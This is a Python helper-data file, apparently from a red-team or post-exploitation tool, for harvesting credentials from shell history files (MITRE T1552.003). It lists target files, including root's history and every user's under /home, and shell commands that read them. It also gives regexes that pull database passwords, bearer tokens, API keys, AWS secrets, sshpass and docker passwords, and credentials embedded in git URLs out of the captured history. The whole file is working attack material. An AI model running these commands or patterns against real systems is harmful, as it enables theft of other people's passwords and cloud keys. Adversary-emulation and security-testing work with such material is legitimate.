#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat May 23 2026

@author: hounsousamuel

Helper data pour BashHistoryRead (T1552.003).
"""

import re
from typing import Dict, Any, Tuple


# =============================================================================
# TARGETS — fichiers d'historique cibles
# =============================================================================

TARGETS: Dict[str, Dict[str, Any]] = {
    "~/.bash_history": {
        "description": "Historique bash de l'utilisateur courant",
        "requires_root": False,
        "priority": "high",
    },
    "~/.zsh_history": {
        "description": "Historique zsh de l'utilisateur courant",
        "requires_root": False,
        "priority": "high",
    },
    "~/.history": {
        "description": "Historique sh générique",
        "requires_root": False,
        "priority": "medium",
    },
    "~/.sh_history": {
        "description": "Historique sh alternatif",
        "requires_root": False,
        "priority": "medium",
    },
    "/root/.bash_history": {
        "description": "Historique bash de root",
        "requires_root": True,
        "priority": "critical",
    },
    "/root/.zsh_history": {
        "description": "Historique zsh de root",
        "requires_root": True,
        "priority": "critical",
    },
    "/home/*/.bash_history": {
        "description": "Historiques bash de tous les users dans /home/",
        "requires_root": True,
        "priority": "high",
    },
}


# =============================================================================
# COMMANDS — commandes à exécuter
# =============================================================================

COMMANDS: Dict[str, Dict[str, Any]] = {
    "cat ~/.bash_history 2>/dev/null || echo 'BASH_HISTORY_DENIED'": {
        "description": "Lecture historique bash utilisateur courant",
        "fail_indicator": "BASH_HISTORY_DENIED",
        "target": "~/.bash_history",
    },
    "cat ~/.zsh_history 2>/dev/null || echo 'ZSH_HISTORY_DENIED'": {
        "description": "Lecture historique zsh utilisateur courant",
        "fail_indicator": "ZSH_HISTORY_DENIED",
        "target": "~/.zsh_history",
    },
    "cat ~/.history 2>/dev/null || echo 'HISTORY_DENIED'": {
        "description": "Lecture historique sh générique",
        "fail_indicator": "HISTORY_DENIED",
        "target": "~/.history",
    },
    "cat ~/.sh_history 2>/dev/null || echo 'SH_HISTORY_DENIED'": {
        "description": "Lecture historique sh alternatif",
        "fail_indicator": "SH_HISTORY_DENIED",
        "target": "~/.sh_history",
    },
    "cat /root/.bash_history 2>/dev/null || echo 'ROOT_BASH_HISTORY_DENIED'": {
        "description": "Lecture historique bash de root",
        "fail_indicator": "ROOT_BASH_HISTORY_DENIED",
        "target": "/root/.bash_history",
    },
    "cat /root/.zsh_history 2>/dev/null || echo 'ROOT_ZSH_HISTORY_DENIED'": {
        "description": "Lecture historique zsh de root",
        "fail_indicator": "ROOT_ZSH_HISTORY_DENIED",
        "target": "/root/.zsh_history",
    },
    "ls /home/ 2>/dev/null": {
        "description": "Liste des répertoires home disponibles",
        "fail_indicator": None,
        "target": None,
    },
    "for u in $(ls /home/); do echo \"=== $u ===\"; cat /home/$u/.bash_history 2>/dev/null; done": {
        "description": "Lecture des historiques bash de tous les users dans /home/",
        "fail_indicator": None,
        "target": "/home/*/.bash_history",
    },
    "wc -l ~/.bash_history /root/.bash_history 2>/dev/null || true": {
        "description": "Taille des historiques (nombre de lignes)",
        "fail_indicator": None,
        "target": None,
    },
}


# =============================================================================
# SENSITIVE_PATTERNS — regex pour détecter des credentials dans l'historique
# =============================================================================

# Format : (pattern, type_credential)
SENSITIVE_PATTERNS: Tuple[Tuple[str, str], ...] = (
    # MySQL / MariaDB
    (r"-p\s*\S+",                                       "mysql/mariadb password"),
    (r"--password[=\s]\S+",                             "db password"),
    (r"PGPASSWORD=\S+",                                 "postgres password env"),
    (r"MYSQL_PWD=\S+",                                  "mysql password env"),
    # Tokens HTTP
    (r"Authorization:\s*Bearer\s+\S+",                  "Bearer token"),
    (r"Authorization:\s*Basic\s+\S+",                   "Basic auth token"),
    (r"-H\s+['\"]?Authorization",                       "HTTP auth header"),
    (r"api[_-]?key[=:\s]+\S+",                         "API key"),
    (r"token[=:\s]+[A-Za-z0-9_\-\.]{20,}",            "token"),
    # AWS
    (r"AWS_ACCESS_KEY_ID=\S+",                          "AWS access key ID"),
    (r"AWS_SECRET_ACCESS_KEY=\S+",                      "AWS secret access key"),
    (r"AWS_SESSION_TOKEN=\S+",                          "AWS session token"),
    # SSH / SCP
    (r"sshpass\s+-p\s+\S+",                            "sshpass cleartext password"),
    (r"ssh\s+.*-i\s+\S+",                              "SSH private key path"),
    # curl
    (r"curl\s+.*-u\s+\S+:\S+",                        "curl user:password"),
    (r"curl\s+.*--user\s+\S+:\S+",                    "curl user:password"),
    # wget
    (r"wget\s+.*--password=\S+",                       "wget password"),
    # Git credentials dans URL
    (r"https?://\S+:\S+@",                             "git credentials in URL"),
    # Docker
    (r"docker\s+login\s+.*-p\s+\S+",                  "docker registry password"),
    # Variables exportées
    (r"export\s+\w*[Pp][Aa][Ss][Ss]\w*=\S+",         "exported password variable"),
    (r"export\s+\w*[Ss][Ee][Cc][Rr][Ee][Tt]\w*=\S+", "exported secret variable"),
    (r"export\s+\w*[Tt][Oo][Kk][Ee][Nn]\w*=\S+",     "exported token variable"),
    # GCP / Azure
    (r"gcloud\s+auth\s+.*--password\s+\S+",           "gcloud password"),
    (r"az\s+login\s+.*--password\s+\S+",              "azure cli password"),
)

# Compilés pour performance
COMPILED_PATTERNS = tuple(
    (re.compile(pattern, re.IGNORECASE), cred_type)
    for pattern, cred_type in SENSITIVE_PATTERNS
)